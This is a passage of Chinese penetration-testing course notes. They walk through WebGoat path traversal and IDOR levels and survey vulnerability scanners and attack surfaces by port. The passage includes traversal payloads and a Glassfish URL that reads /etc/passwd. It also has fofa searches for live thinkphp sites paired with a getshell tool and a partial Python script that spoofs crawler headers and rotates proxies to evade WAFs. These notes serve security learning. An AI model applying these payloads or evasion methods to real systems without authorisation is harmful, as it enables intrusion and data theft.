PreparedStatement statement = connection.prepareStatement(query);
statement.setString(1, accountName);
ResultSet results = statement.executeQuery();
</code></pre>
<p>上面说的方式也不是能够绝对的进行 sql 注入防御，只是减轻。<br>
参数绑定方式可以使用下面方式绕过。<br>
通过使用 case when语句可以将 order by后的 orderExpression表达式中添加select语句。</p>
<p><strong>40.4 Java代码审计入门：WebGoat8</strong><br>
参考：https://www.freebuf.com/vuls/216457.html</p>
<p><strong>涉及资源</strong><br>
https://jwt.io/#encoded-jwt<br>
https://www.ctfhub.com/#Ichallenge<br>
https:/www.zhihu.com/question/43581628<br>
https://www.freebuf.com/vuls/216457.html<br>
https://www.cnblogs.com/klyjb/p/11473857.html</p>
<p><strong>41. 目录遍历访问控制XSS等安全问题</strong><br>
本次直播注重代码分析，熟悉 javaweb 开发结构，掌握 javaweb 代码审计流程，其次才是相关漏洞解释（因前期漏洞原理已基本讲解完<br>
毕），通过本次直播大家务必学会分析相关代码路径，结构，框架等知识点。</p>
<p><img src="https://jinqipiaopiao.github.io//post-images/1634471718234.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1634471721961.png" alt="" loading="lazy"><br>
涉及资源<br>
https://pan.baidu.com/s/19-w0GeDVYvHH6yRz9cNpGw oms7</p>
<p>————————————————<br>
版权声明：本文为CSDN博主「进击的网安攻城狮」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>
原文链接：https://blog.csdn.net/weixin_41665162/article/details/119790421</p>
<h1 id="2021-10-18">2021-10-18</h1>
<h1 id="java-安全-目录遍历访问控制-xss-等安全问题">JAVA 安全 - 目录遍历访问控制 XSS 等安全问题</h1>
<p><strong>Javaweb 路径遍历</strong><br>
靶场：webgoat-Path traversal（路径遍历）<br>
路径（目录）遍历是一种漏洞，攻击者可以通过该漏洞访问或存储应用程序运行位置之外的文件和目录。这可能会导致从其他目录读取文件，以及在文件上传覆盖关键系统文件的情况下。</p>
<p>第一关<br>
<img src="https://jinqipiaopiao.github.io//post-images/1634530825006.png" alt="" loading="lazy"></p>
<p>文件上传配合目录遍历 覆盖文件自定义文件存储地址-基于用户名存储问题<br>
在此关卡中，目标是覆盖文件系统上的特定文件。当然，WebGoat 关心用户，因此您需要将文件上传到正常上传位置之外的以下位置，得知他的任务是将文件上传到webgoat指定的其他目录上</p>
<p>1、随便上传一个文件抓包查看：<br>
<img src="https://jinqipiaopiao.github.io//post-images/1634530828902.png" alt="" loading="lazy"></p>
<p>2、抓包放行后,得到存储路径<br>
<img src="https://jinqipiaopiao.github.io//post-images/1634530833241.png" alt="" loading="lazy"></p>
<p>3、可以看出是将fullName作为文件的上一目录上传，即\username\fullname\文件名<br>
4、故我们尝试通过…/存储到上一路径<br>
5、将fullname改为…/test<br>
6、放行，成功<br>
<img src="https://jinqipiaopiao.github.io//post-images/1634530845195.png" alt="" loading="lazy"></p>
<p>7、白盒审计<br>
POST、GET、@RequestBody和@RequestParam区别<br>
@RequestParam有三个配置参数：<br>
required 表示是否必须，默认为 true，必须。<br>
defaultValue 可设置请求参数的默认值。<br>
value 为接收url的参数名（相当于key值）。</p>
<p>关键代码：</p>
<pre><code>@ResponseBody
public AttackResult uploadFileHandler(@RequestParam(&quot;uploadedFile&quot;) MultipartFile file, @RequestParam(value = &quot;fullName&quot;, required = false) String fullName) {
return super.execute(file, fullName);
}
</code></pre>
<p>预防：<br>
目录解析</p>
<p>springframework javaweb的spring框架，类似于php的phpthink框架</p>
<p><strong>第二关</strong></p>
<figure data-type="image" tabindex="118"><img src="https://jinqipiaopiao.github.io//post-images/1634530853170.png" alt="" loading="lazy"></figure>
<p>同样的任务，只是用了一个replace将…/去掉而已，双写即可<br>
Payload: …//x<br>
<img src="https://jinqipiaopiao.github.io//post-images/1634530857955.png" alt="" loading="lazy"></p>
<p>白盒审计：</p>
<p><img src="https://jinqipiaopiao.github.io//post-images/1634530862446.png" alt="" loading="lazy"><br>
过滤fullName中的…/一次</p>
<p>第三关<br>
可知不对fullname验证</p>
<p><img src="https://jinqipiaopiao.github.io//post-images/1634530867865.png" alt="" loading="lazy"><br>
发现fullname赋值为什么，最终都是test</p>
<p><img src="https://jinqipiaopiao.github.io//post-images/1634530873197.png" alt="" loading="lazy"><br>
抓包查看，修改filename，在前面加…/</p>
<p><img src="https://jinqipiaopiao.github.io//post-images/1634530879676.png" alt="" loading="lazy"><br>
成功</p>
<p><img src="https://jinqipiaopiao.github.io//post-images/1634530884436.png" alt="" loading="lazy"><br>
<strong>第四关</strong><br>
这关要求找到名叫path-traversal-secret.jpg的文件。</p>
<p>1、先点一下show random cat picture按钮，burpsuite抓包</p>
<p><img src="https://jinqipiaopiao.github.io//post-images/1634530898968.png" alt="" loading="lazy"><br>
2、请求包没有什么有用的数据，放行查看响应包</p>
<p><img src="https://jinqipiaopiao.github.io//post-images/1634530903497.png" alt="" loading="lazy"><br>
3、而任务是想让我们尝试找到一个名为path-traversal-secret.jpg，</p>
<p>4、像下图这样random-picture后面增加?id=1.jpg，发送报文之后，响应404 Not Found，发现服务器查找的文件名在id的值后面加上了.jpg。所以如果要查看1.jpg的内容，应该在random-picture后面增加?id=1</p>
<p><img src="https://jinqipiaopiao.github.io//post-images/1634530964176.png" alt="" loading="lazy"><br>
接下来可以试试random-picture后面增加?id=path-traversal-secret<br>
结果返回了400 Bad Request<br>
<img src="https://jinqipiaopiao.github.io//post-images/1634530991941.png" alt="" loading="lazy"></p>
<p>再试试random-picture后面增加?id=…/path-traversal-secret</p>
<p>也返回了400 Bad Request，而且提示请求参数中有非法字符<br>
<img src="https://jinqipiaopiao.github.io//post-images/1634530998617.png" alt="" loading="lazy"></p>
<p>把上述payload中的<code>…/改为%2e%2e%2f（…/的url编码）</code><br>
还是返回400 Bad Request，但是不提示有非法字符了。<br>
那再往上一级目录看看，<code>?id=%2e%2e%2f%2e%2e%2fpath-traversal-secret</code><br>
从返回结果来看，已经找到要找的文件了。<br>
提示用户名的SHA-512 hash就是本题的答案<br>
<img src="https://jinqipiaopiao.github.io//post-images/1634531003811.png" alt="" loading="lazy"></p>
<p>网上搜一下SHA512在线，然后把用户名进行SHA512 hash<br>
<img src="https://jinqipiaopiao.github.io//post-images/1634531010130.png" alt="" loading="lazy"></p>
<p>将得到的结果填入小旗子后面的输入框，submit secret即可通过本关<br>
<img src="https://jinqipiaopiao.github.io//post-images/1634531015840.png" alt="" loading="lazy"></p>
<p><strong>Javaweb 代码分析-前端验证安全问题</strong><br>
不安全登录 Insecure Login-基于前端认证<br>
1、页面提示单击登录抓包<br>
<img src="https://jinqipiaopiao.github.io//post-images/1634531042455.png" alt="" loading="lazy"></p>
<p>2、得到用户和密码，登录通过<br>
<img src="https://jinqipiaopiao.github.io//post-images/1634531048397.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1634531053660.png" alt="" loading="lazy"></p>
<p><strong>1、黑盒测试查看源代码发现是js判断，关闭js即可</strong><br>
<img src="https://jinqipiaopiao.github.io//post-images/1634531061121.png" alt="" loading="lazy"></p>
<p><strong>2、白盒测试，查看函数，发现有16进制，解码后是账号密码</strong><br>
16进制转换网页<br>
转换前把\x去掉</p>
<figure data-type="image" tabindex="119"><img src="https://jinqipiaopiao.github.io//post-images/1634531079962.png" alt="" loading="lazy"></figure>
<p><strong>3、白盒测试，查看submit点击的源代码</strong><br>
<img src="https://jinqipiaopiao.github.io//post-images/1634531085935.png" alt="" loading="lazy"></p>
<p><strong>Javaweb 代码分析-逻辑越权安全问题</strong><br>
代码分析过关逻辑<br>
<img src="https://jinqipiaopiao.github.io//post-images/1634531093017.png" alt="" loading="lazy"></p>
<p>此题目是为了说明请求返回的包里可能包含了更多的内容。此题目要求将response包返回的所有参数比界面上View Profile中显示的多的几个参数，具体如下。<br>
<img src="https://jinqipiaopiao.github.io//post-images/1634531099341.png" alt="" loading="lazy"></p>
<p><strong>枚举用户参数对应数据库的其他数据信息</strong><br>
role,userid<br>
<img src="https://jinqipiaopiao.github.io//post-images/1634531104024.png" alt="" loading="lazy"></p>
<p><strong>url接口</strong><br>
在Stage 3中知道了tom的userId是2342384。<br>
<img src="https://jinqipiaopiao.github.io//post-images/1634531108907.png" alt="" loading="lazy"></p>
<pre><code>{
&quot;role&quot; : 3,
&quot;color&quot; : &quot;yellow&quot;,
&quot;size&quot; : &quot;small&quot;,
&quot;name&quot; : &quot;Tom Cat&quot;,
&quot;userId&quot; : &quot;2342384&quot;
}
</code></pre>
<p>该题目就是通过路由访问tom的配置信息，在输入框里输入WebGoat/IDOR/profile/2342384，就通过了此题目。<br>
<img src="https://jinqipiaopiao.github.io//post-images/1634531114557.png" alt="" loading="lazy"></p>
<p><strong>白盒测试</strong><br>
<img src="https://jinqipiaopiao.github.io//post-images/1634531120951.png" alt="" loading="lazy"></p>
<p>通过参数值构造 URL 获取用户更多的信息<br>
<strong>WebGoat/IDOR/profile/2342384</strong></p>
<p>Javaweb 代码分析-XSS 跨站安全问题<br>
XSS 跨站<br>
代码分析结合页面解释过关<br>
第2关：yes</p>
<p>第7关：修改card number + 绕过黑名单<br>
<img src="https://jinqipiaopiao.github.io//post-images/1634531125571.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1634531129816.png" alt="" loading="lazy"></p>
<p><strong>拓展-安卓 APP 反编译 JAVA 代码</strong><br>
#核心知识点：Java 代码分析 === Apk_App 分析<br>
模块引用（框架,自带等），路由地址，静态文件（html.js 等）,简易代码理解等</p>
<p>————————————————<br>
版权声明：本文为CSDN博主「硫酸超」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>
原文链接：https://blog.csdn.net/weixin_45441315/article/details/120032501</p>
<h1 id="2021-10-19">2021-10-19</h1>
<p>#42. 操作系统之漏洞探针类型利用修复（42-45）</p>
<p>相关名词解释：</p>
<p>CVSS（Common Vulnerability Scoring System，即“通用漏洞评分系统”）</p>
<p>CVSS是安全内容自动化协议（SCAP）的一部分<br>
通常CVSS与CVE一同由每个国家漏洞库（NVD）发布并保持数据的更新<br>
分值范围：0-10<br>
不同机构按CVSS分值定义威胁的中、高、低威胁级别<br>
CVSS体现弱点的风险，威胁级别（severity）表现弱点风险对企业的影响程度<br>
CVSS分值是工业标准，但威胁级别不是<br>
CVE（Common Vulnerabilities &amp; Exposures，即“通用漏洞披露”）</p>
<p>已公开的信息安全漏洞字典，统一的漏洞编号标准<br>
MITRE公司负责维护（非盈利机构）<br>
扫描器的大部分扫描项都对应一个CVE编号<br>
实现不同厂商之间信息交换的统一标准<br>
CVE发布流程<br>
发现漏洞<br>
CAN负责指定CVE ID<br>
发布到CVE List——CVE-2008-4250<br>
exp:利用</p>
<p>poc:验证</p>
<p>漏洞发现-操作系统之漏洞探针类型利用修复</p>
<p>1.角色扮演：操作系统权限的获取会造成服务器上安全问题</p>
<p>2.漏扫工具：Goby，Nmap，Nessus，Openvas，Nexpose等，举例</p>
<p>Goby 忍者系统测试<br>
nmap 默认nse插件（扫描常规漏洞）：<br>
nmap --script=vuln 192.168.33.1<br>
nmap 扩展漏洞扫描模块（参考：https://www.cnblogs.com/shwang/p/12623669.html）<br>
nmap -sV --script=vulscan/vulscan.nse 192.168.199.1<br>
nmap -sV --script=nmap-vulners 192.168.199.1<br>
Nessus 安装-使用-插件库加载扫描（推荐此工具）<br>
下载：https://pan.baidu.com/s/17uA2OmJbV_cDG2C6QnHqqA 提取码：cxd4<br>
3.漏洞类型：权限提升，缓冲器溢出，远程代码执行，未知Bug等</p>
<p>4.漏洞利用：工具框架集成类，漏洞公布平台库类，复现文章参考等</p>
<p>使用工具框架，包括：metasploit、searchsploit、企业单位内部产品等<br>
kali系统<br>
忍者安全渗透系统（NINJUTSU OS)：https://blog.csdn.net/qq_35258210/article/details/115457883<br>
searchsploit使用攻略：https://www.jianshu.com/p/bd8213c53717<br>
搜索漏洞公布平台，寻找单点EXP<br>
https://www.cnvd.org.cn/<br>
https://www.seebug.org/<br>
https://fr.0day.today/<br>
https://www.exploit-db.com/<br>
https://packetstormsecurity.com/<br>
5.漏洞修复：打上漏洞补丁，关闭对应入口点，加上防护软件硬件等</p>
<h1 id="43漏洞发现-web应用之漏洞探针类型利用修复">43：漏洞发现-WEB应用之漏洞探针类型利用修复</h1>
<p><img src="https://jinqipiaopiao.github.io//post-images/1635846102852.png" alt="" loading="lazy"><br>
已知CMS</p>
<p>如常见的dedecms，discuz，wordpress等源码结构，这种一般采用非框架类开发，但是也有少部分采用框架类开发，针对此类源码程序的安全检测，我们要利用公开的漏洞进行测试，如不存在可采用白盒代码审计自行挖掘。</p>
<p>搜索漏洞公布平台，寻找单点EXP：</p>
<p>https://www.cnvd.org.cn/<br>
https://www.seebug.org/<br>
https://fr.0day.today/<br>
https://www.exploit-db.com/<br>
https://packetstormsecurity.com/<br>
使用工具框架进行有针对性的扫描：</p>
<p>CMSScan：综合类，一款适用于WordPress、Drupal、Joomla、vBulletin的安全扫描工具<br>
https://github.com/ajinabraham/CMSScan<br>
wpscan：WordPress扫描工具<br>
https://github.com/wpscanteam/wpscan<br>
kali系统，忍者系统自带<br>
使用时需要在官方（https://wpscan.com）申请一个账号（谷歌人机身份验证，必须FQ），登录后得到一个token，使用wpscan时需要带着这个token。</p>
<pre><code>用法：wpscan --url &lt;URL&gt; --api-token &lt;YourToken&gt; 
</code></pre>
<p>joomscan：Joomla扫描工具<br>
https://github.com/OWASP/joomscan<br>
DrupalScan：Drupal扫描工具<br>
https://github.com/rverton/DrupalScan<br>
其他：先识别CMS，然后网上搜索针对该CMS的漏扫工具<br>
代码审计：</p>
<p>函数点挖掘<br>
功能点挖掘<br>
框架类挖掘<br>
开发框架</p>
<p>如常见的thinkphp，spring，flask等开发的源码程序，这种源码程序正常的安全测试思路：先获取对应的开发框架信息（名字，版本），通过公开的框架类安全问题进行测试，如不存在可采用白盒代码审计自行挖掘。</p>
<p>常见的PHP开发框架：Yii、Laravel、Thinkphp<br>
常见的Java开发框架：Shiro、Struts、Spring、Maven<br>
常见的Python开发框架：Flask、Django、Tornado<br>
未知CMS</p>
<p>如常见的企业和个人内部程序源码，也可以是某CMS二次开发的源码结构，针对此类的程序源码测试思路：能识别二次开发就按已知CMS思路进行，不能确定二次开发的话可以采用常规综合类扫描工具或脚本进行探针，也可以采用人工探针（功能点，参数，盲猜），同样在有源码的情况下也可以进行代码审计自行挖掘。</p>
<p><strong>案例1：开发框架类源码渗透测试-咨讯-thinkphp</strong></p>
<p>1.fofa搜索&quot;index/login/login&quot;，寻找测试网站。</p>
<p>2.构造错误的url，查看错误回显，确定网站使用thinkphp框架及其版本。</p>
<p>3.使用专门工具对thinkphp进行漏洞挖掘，比如</p>
<p>TPScan（jar文件）：一键ThinkPHP漏洞检测工具（参考：https://www.jeeinn.com/2021/03/1493/）<br>
https://github.com/tangxiaofeng7/TPScan<br>
TPScan（基于Python3）：一键ThinkPHP漏洞检测工具：<br>
https://github.com/Lucifer1993/TPscan<br>
thinkPHP5.x远程命令执行(getshell)测试工具<br>
地址：https://pan.baidu.com/s/17UOif8XD_-V_IMVAHXVlcw 提取码: 31x2<br>
4.找到漏洞后，通过工具框架，漏洞公布平台，复现文章参考等进行漏洞利用。<br>
<strong>案例2：开发框架类源码渗透测试-咨讯-spring</strong></p>
<p>1.使用Vulhub一键搭建漏洞测试靶场（https://vulhub.org/）</p>
<p>2.在Vulhub网站搜索某类漏洞，按照步骤，启动环境，漏洞复现。如图</p>
<p><img src="https://jinqipiaopiao.github.io//post-images/1636096377907.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1636096386351.png" alt="" loading="lazy"><br>
<strong>案例3：已知CMS非框架类渗透测试-工具脚本-wordpress</strong></p>
<p>1.环境准备：登录墨者学院，启动靶场环境：WordPress插件漏洞分析溯源。<br>
2.CMS识别：进入首页，根据底部版权信息得知，该网站CMS使用的是WordPress。<br>
3.使用wpscan工具扫描。<br>
(1)wpscan官网注册并登录账号，得到token。<br>
<img src="https://jinqipiaopiao.github.io//post-images/1636096392240.png" alt="" loading="lazy"></p>
<pre><code>(2)kali下启动扫描：$ wpscan --url http://219.153.49.228:41640/ --api-token &lt;mytoken&gt;
</code></pre>
<p>扫描结果如下：</p>
<p><img src="https://jinqipiaopiao.github.io//post-images/1636096397695.png" alt="" loading="lazy"><br>
4.去网上找到相关文章、poc等，进行漏洞利用。</p>
<p>案例4：已知CMS非框架类渗透测试-代码审计-qqyewu_php<br>
seay源码审计系统<br>
案例5：未知CMS非框架类渗透测试-人工-wg<br>
外挂类网站</p>
<h1 id="44漏洞发现-app应用之漏洞探针类型利用修复">44：漏洞发现-APP应用之漏洞探针类型利用修复</h1>
<p><img src="https://jinqipiaopiao.github.io//post-images/1636194110938.png" alt="" loading="lazy"><br>
思路说明：</p>
<p>反编译提取URL或抓包获取url，进行web应用测试，如不存在或走其他协议的情况下，需采用网络接口抓包进行数据获取，转至其他协议安全测试！</p>
<p><strong>案例1：抓包精灵</strong></p>
<p>Android抓包软件，可以安装到手机上，不需要过多设置，即可抓住手机上app产生的http/https包并自动解析，确定是只能看不能操作。</p>
<p>地址：https://github.com/huolizhuminh/NetWorkPacketCapture/releases/tag/1.0.4</p>
<p><strong>案例2：ApkAnalyser</strong></p>
<p>简介：一键提取安卓应用中可能存在的敏感信息。</p>
<p>用法：将所有app放到程序自动创建的apps目录，再运行主程序就好了，不用加参数。</p>
<p>功能：目前提取了APK内所有字符串、所有URLs、所有ip、可能是hash值的字符串、存在的敏感词（如oss.aliyun）、可能是accessKey的值。</p>
<p>地址：https://github.com/TheKingOfDuck/ApkAnalyser//releases/download/1.0/apkAnalyser.zip</p>
<p><strong>案例3：xray与burp联动被动扫描</strong></p>
<p>参考：https://www.cnblogs.com/L0ading/p/12388928.html</p>
<h1 id="45漏洞发现-api接口服务之漏洞探针类型利用修复">45：漏洞发现-API接口服务之漏洞探针类型利用修复</h1>
<figure data-type="image" tabindex="120"><img src="https://jinqipiaopiao.github.io//post-images/1636194535649.png" alt="" loading="lazy"></figure>
<p>接口服务类安全测试</p>
<p>根据前期信息收集针对目标端口服务类探针后进行的安全测试，主要涉及攻击方法：口令安全，WEB类漏洞，版本漏洞等，其中产生的危害可大可小，属于端口服务/第三方服务类安全测试面。一般在已知应用无思路的情况下选用的安全测试方案。</p>
<p>API接口-webservice RESTful APT</p>
<p>https://xz.aliyun.com/t/2412</p>
<p>https://github.com/SmartBear/soapui<br>
根据应用自身的功能方向决定，安全测试目标需有API接口才能进行此类测试，主要涉及的安全问题：自身安全，配合WEB，业务逻辑等，其中产生的危害可大可小，属于应用API接口网络服务测试面，一般也是在存在接口调用的情况下的测试方案。</p>
<p>WSDL(网络服务描述语言，web services description language)是一门基于XML的语言，用于描述web services 以及如何对他们进行访问。</p>
<p>漏洞关键字，配合shodan,fofa,zoomye搜索</p>
<pre><code>inurl: jws?wsdl
inurl: asmx?wsdl
inurl: aspx?wsdl
inurl: ascx?wsdl
inurl: ashx?wsdl
inurl: dll?wsdl
inurl: exe?wsdl
inurl: php?wsdl
inurl: pl?wsdl
inurl: ?wsdl
inurl: asmx?wsdl
filetype: ?wsdl
</code></pre>
<p>1.web服务类</p>
<pre><code>tomcat--80/8080/8009
manager弱口令
put上传webshell
HTTP慢速攻击
ajr文件包含漏洞 CVE-2020-1938
Jboss--8080
后台弱口令
console后台部署war包
Java反序列化
远程代码执行
webSphere--9080
后台弱口令
任意文件泄露
Java反序列化
Weblogic--7001/7002
后台弱口令
console后台部署war包
SSRF
测试页面上传webshell
Java反序列化
	CVE-2018-2628
	CVE-2018-2893
	CVE-2017-10271
	CVE-2019-2725
	CVE-2019-2729
Glassfish--8080/4848
暴力破解
任意文件读取
认证绕过
Jetty--8080
远程共享缓冲区溢出
Apache--80/8080
HTTP慢速攻击
解析漏洞
目录遍历
Apache Solr--8983
远程命令执行
　　CVE-2017-12629
　　CVE-2019-0193
IIS--80
put上传webshell
IIS解析漏洞
IIS提权
IIS远程代码执行 CVE-2017-7269
Resin-8080
目录遍历
远程文件读取
Axis2--8080
后台弱口令
Lutos--1352
后台弱口令
信息泄露
跨站脚本攻击
Nginx--80/443
HTTP慢速攻击
解析漏洞
</code></pre>
<p>2.数据库类</p>
<pre><code>MySQL--3306
弱口令
身份认证漏洞 CVE-2012-2122
拒绝服务攻击
phpmyadmin万能密码or弱口令
UDF/MOF提权
Mssql--1433
弱口令
存储过程提权
Oralce--1521
弱口令
TNS漏洞
Redis--6379
弱口令
未授权访问
PostgreSQL--5432
弱口令
缓冲区溢出 CVE-2014-2669
MongoDB--27001
弱口令
未授权访问
DB2--5000
安全限制绕过进行未授权操作 CVE-2015-1922
SysBase--5000/4100
弱口令
命令注入
Memcache-11211
未授权访问
配置漏洞
ElasticSearch--9200/9300
未授权访问
远程代码执行
文件办理
写入Webshell
</code></pre>
<p>3.大数据类</p>
<pre><code>Hadoop--50010
远程命令执行
Zookeeper--2181
未授权访问
</code></pre>
<p>4.文件共享</p>
<pre><code>ftp--21
弱口令
匿名访问
上传后们
远程溢出
漏洞攻击
NFS--2049
未授权访问
Samba--137
弱口令
未授权访问
远程代码执行 CVE-2015-0240
LDAP--389
弱口令
注入
未授权访问
</code></pre>
<p>5.远程访问</p>
<pre><code>SSH--22
弱口令
28退格漏洞
OpenSSL漏洞
用户名枚举
Telnet--23
弱口令
RDP--3389
弱口令
shift粘滞键后门
缓冲区溢出
MS12-020
CVE-2019-0708
WNC--5901
弱口令
认证口令绕过
拒绝服务攻击 CVE-2015-5239
权限提升 CVE-2013-6886
Pcanywhere-5632
拒绝服务攻击
权限提升
代码执行
X11-6000
未授权访问 CVE-1999-0526
</code></pre>
<p>6.邮件服务</p>
<pre><code>SMTP--25/465
弱口令
未授权访问
邮件伪造
POP3-110/995
弱口令
未授权访问
IMAP-143/993
弱口令
任意文件读取
</code></pre>
<p>7.其他服务</p>
<pre><code>DNS--53
DNS区域传输
DNS劫持
DNS欺骗
DNS缓存投毒
DNS隧道
DHCP-67/68
DHCP劫持
DHCP欺骗
SNMP--161
弱口令
Rlogin-512/513/514
rlogin登录
Rsync--873
未授权访问
本地权限提升
Zabbix-8069
远程命令执行
RMI--1090/1099
java反序列化
Docker-2375
未授权访问
</code></pre>
<p><strong>案例1：其他补充类-基于端口web站点又测试</strong></p>
<p>很多网站域名是一个网站，域名+端口又是一个网站，这样当你渗透测试时，相当于多了一个目标，相应的成功几率也会变高。举例：http://yc.zjgsu.edu.cn和http://yc.zjgsu.edu.cn:8080/</p>
<p><strong>案例2：其他补充类-基于域名web站点又测试</strong></p>
<p>思路1：当我们拿到一个域名时，比如www.jmisd.cn，我们可能首先会去查询它的子域名，这是一个方向，这里我们提供另外一种思路，查询它的相关域名，方法是百度 域名查询，会有很多可以查询域名是否已被注册的网站，比如西部数码网站，我们进入后搜索jmisd，会显示以下3个域名已被注册，然后我们分别查看它们的whois信息、下方版权信息等，查看它们与是否与原网站有相同点，若有，说明这两个网站是同一个公司的，然后就为渗透这个网站找到了一条新路。</p>
<p>0<br>
思路2：当我们拿到一个域名时，通过查看它的whois信息、下方版权信息等获取到该网站特有的一些关键信息，然后直接百度搜索这些信息，就有可能得到一些与该网站相关的其他域名。</p>
<p><strong>案例3：其他补充类-基于IP配合端口又测试</strong></p>
<p>思路1：假设xx.com对应目录d:/wwwroot/xx/，192.168.33.2对应目录d:/wwwroot/，此时目录d:/wwwroot/下有一个网站备份压缩包xx.zip，那么访问xx.com/xx.zip不能下载，但是访问192.168.33.2/xx.zip可以成功下载。</p>
<p>思路2：给定一个域名，我们先找到对应的ip，然后扫描IP，可以发现开放的端口，我们进行目录扫描或敏感文件扫描时，不仅需要对域名扫描，还要对IP以及IP:端口进行扫描，这样会发现更多的漏洞。</p>
<p><strong>案例4：端口服务类-Tomcat弱口令安全问题</strong></p>
<p>1.使用Vulhub一键搭建漏洞测试靶场（https://vulhub.org/）</p>
<p>docker-compose 启动报错时，试试命令：sudo docker-compose up -d</p>
<p>参考：http://wxnacy.com/2019/01/23/docker-compose-up-error/</p>
<p>2.在Vulhub网站搜索tomcat弱口令漏洞洞，按照步骤，启动环境，漏洞复现。如图<br>
<img src="https://jinqipiaopiao.github.io//post-images/1636194555789.png" alt="" loading="lazy"><br>
<strong>案例5：端口服务类-Glassfish任意文件读取</strong></p>
<pre><code>访问https://192.168.28.128:4848/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd，返回服务器文件。
</code></pre>
<p><img src="https://jinqipiaopiao.github.io//post-images/1636194559564.png" alt="" loading="lazy"><br>
<strong>案例6：口令安全脚本工具简要使用-Snetcarcker</strong><br>
Snetcarcker下载：https://github.com/shack2/SNETCracker/releases<br>
SNETCracker超级弱口令检查工具是一款Windows平台的弱口令审计工具，支持批量多线程检查，可快速发现弱密码、弱口令账号，密码支持和用户名结合进行检查，大大提高成功率，支持自定义服务端口和字典。<br>
工具采用C#开发，需要安装.NET Framework 4.0，工具目前支持SSH、RDP、SMB、MySQL、SQLServer、Oracle、FTP、MongoDB、Memcached、PostgreSQL、Telnet、SMTP、SMTP_SSL、POP3、POP3_SSL、IMAP、IMAP_SSL、SVN、VNC、Redis等服务的弱口令检查工作。<br>
工具特点：<br>
1.支持多种常见服务的口令破解，支持RDP（3389远程桌面）弱口令检查。<br>
2.支持批量导入IP地址或设置IP段，同时进行多个服务的弱口令检查。<br>
3.程序自带端口扫描功能，可以不借助第三方端口扫描工具进行检查。<br>
4.支持自定义检查的口令，自定义端口。<br>
其他工具：hydra</p>
<p><strong>案例7：API接口类-网络服务类探针利用测试-AWVS</strong><br>
测试WSDL网络服务可使用AWVS扫描<br>
awvs下载：https://www.cnblogs.com/xyongsec/p/12370488.html<br>
小技巧：sqlmap指定在参数id处进行注入：使id=1*</p>
<h1 id="2021-11-5-小迪渗透waf绕过">2021-11-5 小迪渗透&amp;Waf绕过</h1>
<h1 id="46信息收集之反爬虫延迟代理技术46-49">46.信息收集之反爬虫延迟代理技术(46-49)</h1>
<p><img src="https://jinqipiaopiao.github.io//post-images/1636093502407.png" alt="" loading="lazy"><br>
<strong>网站部署waf时，采用进程抓包工具抓取webpathbrute数据包分析，一般有2种结果：</strong></p>
<p>1.直接误报或者无结果<br>
2.扫描一段时间后突然误报<br>
扫描探针机制</p>
<p>数据包拦截<br>
速度过快拦截<br>
WebPathBrute-Web路径暴力探测工具：https://github.com/7kbstorm/7kbscan-WebPathBrute</p>
<p>使用WebPathBrute扫描网站目录，当网站服务器分别部署了以下waf时，对拦截机制进行测试分析，结果如下：</p>
<p><strong>1.safedog-默认拦截机制-未开CC</strong></p>
<p>扫描结果：出现误报，全部200状态码<br>
原因：浏览器采用get方法，工具扫描采用head方法。<br>
绕过方法：更改提交方式（改为get方法）或模拟用户<br>
<strong>2.safedog-默认拦截机制-开启CC</strong></p>
<p>扫描结果：误报<br>
绕过方法：延时或代理池或爬虫引擎。<br>
<strong>2.1 延时</strong><br>
可开启延时扫描，慢速扫描，缺点是速度过慢。<br>
<strong>2.2 代理池</strong><br>
网上搜索代理池，写python脚本，添加代理池。确定是WAF可能开启了防代理，无法绕过。<br>
<strong>2.3 爬虫引擎</strong><br>
可在软件中自定义添加爬虫引擎头部（但是扫描不出现结果）<br>
各大搜索引擎的User-Agent：https://www.cnblogs.com/iack/p/3557371.html<br>
<strong>3.Aliyun_os-默认拦截机制</strong></p>
<p>扫描结果：对部署在阿里云上的网站进行目录扫描时，扫着扫着网站就打不开了，大约1个小时后才能重新打开，重启服务器也不能使网站重新打开，只能等一个小时，猜测这是因为阿里云自己有一套防护体系。<br>
绕过方法：无法模拟搜索引擎爬虫绕过，只能采用延时或代理池<br>
<strong>4.BT（防火墙插件）-默认拦截机制</strong></p>
<p><strong>拦截机制举例：</strong><br>
60秒内，请求同一URL超过120次，封锁IP 100秒。<br>
60秒内，恶意请求6次，封IP 600秒。<br>
什么是恶意请求？比如宝塔检测到用户频繁请求index.php.bak等备份文件，即判断为恶意请求，拦截。对于这种拦截，绕过方法为字典重写（参考于upload-labs做字典）<br>
绕过方法：爬虫未知，延时可以，代理池可以<br>
5.阿里云（免费）+ safedog + 宝塔（付费插件）</p>
<p>绕过方法：延时或代理池<br>
6.python编写绕过脚本，进行目录扫描</p>
<p>自定义headers头部，模拟用户<br>
休眠3秒，模拟延时（测试发现，阿里云至少休眠3秒，否则拦截）<br>
添加proxy，从网上爬取代理池，按需添加，比如一个代理发10个请求，接着换另一个代理。<br>
脚本如下<br>
#搜索引擎爬虫模拟及模拟真实用户</p>
<pre><code>import requests
import time

headers={
'Connection': 'keep-alive',
'Cache-Control': 'max-age=0',
'Upgrade-Insecure-Requests': '1',
#模拟用户 Kit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36
#模拟引擎 Mozilla/5.0 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)
#更多爬虫引擎：https://www.cnblogs.com/iack/p/3557371.html
'User-Agent': 'Mozilla/5.0 (compatible; Baiduspider-render/2.0;+http://www.baidu.com/search/spider.html)',
'Sec-Fetch-Dest': 'document',
'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'Sec-Fetch-Site': 'none',
'Sec-Fetch-Mode': 'navigate',
'Sec-Fetch-User': '?1',
'Accept-Encoding': 'gzip, deflate, br',
